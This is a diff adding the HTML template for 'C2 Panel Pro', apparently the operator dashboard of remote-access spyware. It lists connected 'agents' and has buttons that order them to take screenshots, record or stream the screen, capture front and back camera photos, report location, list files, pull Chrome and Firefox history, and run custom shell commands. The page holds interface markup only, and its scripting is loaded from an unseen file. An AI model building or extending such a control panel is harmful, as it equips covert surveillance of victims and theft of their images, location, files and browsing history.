@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Panel Pro</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background: #0a0e17; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; }
+        .sidebar { background: #111827; min-height: 100vh; border-right: 1px solid #1f2937; }
+        .sidebar .nav-link { color: #9ca3af; padding: 12px 20px; border-radius: 8px; }
+        .sidebar .nav-link.active, .sidebar .nav-link:hover { background: #1e293b; color: #10b981; }
+        .card { background: #1e293b; border: none; border-radius: 12px; margin-bottom: 20px; }
+        .card-header { background: #0f172a; border-bottom: 1px solid #334155; font-weight: 600; }
+        .btn-command { margin: 5px; min-width: 100px; }
+        .log-area { background: #0f172a; border-radius: 8px; padding: 12px; font-family: monospace; font-size: 12px; height: 300px; overflow-y: auto; }
+        .log-entry { border-bottom: 1px solid #334155; padding: 6px 0; }
+        .media-preview { max-width: 100%; border-radius: 8px; margin-top: 10px; }
+        .agent-badge { cursor: pointer; transition: 0.2s; }
+        .agent-badge:hover { transform: translateX(5px); }
+        .status-online { color: #10b981; }
+        .status-offline { color: #ef4444; }
+        iframe { width: 100%; height: 400px; border: none; border-radius: 8px; background: #000; }
+    </style>
+</head>
+<body>
+<div class="container-fluid">
+    <div class="row">
+        <div class="col-md-3 col-lg-2 sidebar p-3">
+            <h4 class="text-center mb-4">🎮 C2 Panel Pro</h4>
+            <select id="agentSelect" class="form-select bg-dark text-white border-secondary mb-3">
+                <option value="">-- Select Agent --</option>
+            </select>
+            <hr class="border-secondary">
+            <nav class="nav flex-column">
+                <a class="nav-link active" href="#" data-page="dashboard">📊 Dashboard</a>
+                <a class="nav-link" href="#" data-page="logs">📜 Logs</a>
+                <a class="nav-link" href="#" data-page="media">🖼️ Media Gallery</a>
+            </nav>
+        </div>
+        <div class="col-md-9 col-lg-10 p-4">
+            <div id="dashboardPage">
+                <div class="d-flex justify-content-between align-items-center mb-4">
+                    <h2>Command Center</h2>
+                    <span id="selectedAgentDisplay" class="badge bg-secondary">No agent selected</span>
+                </div>
+                <div class="card">
+                    <div class="card-header">⚡ Quick Commands</div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <button class="btn btn-primary btn-command" data-cmd="screenshot">📸 Screenshot</button>
+                                <button class="btn btn-success btn-command" data-cmd="location">📍 Location</button>
+                                <button class="btn btn-info btn-command" data-cmd="filelist">📁 File List</button>
+                                <button class="btn btn-warning btn-command" data-cmd="ping">🏓 Ping</button>
+                            </div>
+                            <div class="col-md-6">
+                                <button class="btn btn-danger btn-command" data-cmd="screen_record">🎥 Screen Record (5s)</button>
+                                <button class="btn btn-secondary btn-command" data-cmd="screen_live">🖥️ Screen Live (Start)</button>
+                                <button class="btn btn-dark btn-command" data-cmd="stop_live">⏹️ Stop Live</button>
+                            </div>
+                        </div>
+                        <div class="row mt-2">
+                            <div class="col-md-6">
+                                <button class="btn btn-outline-light btn-command" data-cmd="camera_front">🤳 Camera Front</button>
+                                <button class="btn btn-outline-light btn-command" data-cmd="camera_back">📷 Camera Back</button>
+                            </div>
+                            <div class="col-md-6">
+                                <button class="btn btn-outline-info btn-command" data-cmd="history_chrome">🌐 Chrome History</button>
+                                <button class="btn btn-outline-info btn-command" data-cmd="history_firefox">🦊 Firefox History</button>
+                            </div>
+                        </div>
+                        <div class="mt-3">
+                            <label>Custom Command:</label>
+                            <div class="input-group">
+                                <input type="text" id="customCommand" class="form-control bg-dark text-white" placeholder="e.g., ls /sdcard/">
+                                <button id="sendCustomBtn" class="btn btn-outline-light">Send</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-header">📡 Results & Live Stream</div>
+                    <div class="card-body">
+                        <div id="resultsArea" class="log-area" style="height: 200px;"></div>
+                        <div id="liveStreamArea" style="display:none; margin-top:15px;">
+                            <h6>Live Screen Stream:</h6>
+                            <img id="liveStreamImg" src="" style="width:100%; border-radius:8px; background:#000;">
+                        </div>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-header">🖥️ Connected Agents</div>
+                    <div class="card-body" id="agentsList"></div>
+                </div>
+            </div>
+            <div id="logsPage" style="display:none;">
+                <div class="card"><div class="card-header">📜 Logs</div><div class="card-body"><div id="logsArea" class="log-area" style="height:500px;"></div></div></div>
+            </div>
+            <div id="mediaPage" style="display:none;">
+                <div class="card"><div class="card-header">🖼️ Latest Media</div><div class="card-body">
+                    <div id="screenshotPreview"><h6>Screenshot:</h6><img id="lastScreenshot" class="media-preview"></div>
+                    <div id="cameraPreview"><h6>Camera Photo:</h6><img id="lastCamera" class="media-preview"></div>
+                </div></div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
+</body>
+</html>
